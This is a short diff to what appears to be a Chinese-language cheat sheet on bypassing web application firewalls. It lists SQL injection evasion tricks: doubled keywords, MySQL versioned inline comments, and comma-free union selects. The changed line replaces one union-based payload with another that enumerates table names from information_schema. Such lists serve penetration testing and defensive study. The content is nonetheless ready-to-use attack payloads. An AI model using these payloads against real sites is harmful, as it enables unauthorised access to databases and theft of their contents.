@@ -191,7 +191,7 @@ WAF is a defender for web.
 - 雙關鍵字繞過  
   - `UNIunionON`  
 - 內聯注釋繞過(**實戰中這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個`*/`去閉合多個`/*!`**)  
-  - `id=1/*!50000UnIoN*/+SeLeCT+1,2,concat(/*!50000table_name*/)+FrOM /*50000information_schema*/.tables /*!50000WHERE*/+/*!50000TaBlE_ScHeMa*/+like+database()#`  
+  - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`
 - 逗號繞過  
   - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
   - limit逗號 `limit 1 offset 0`  
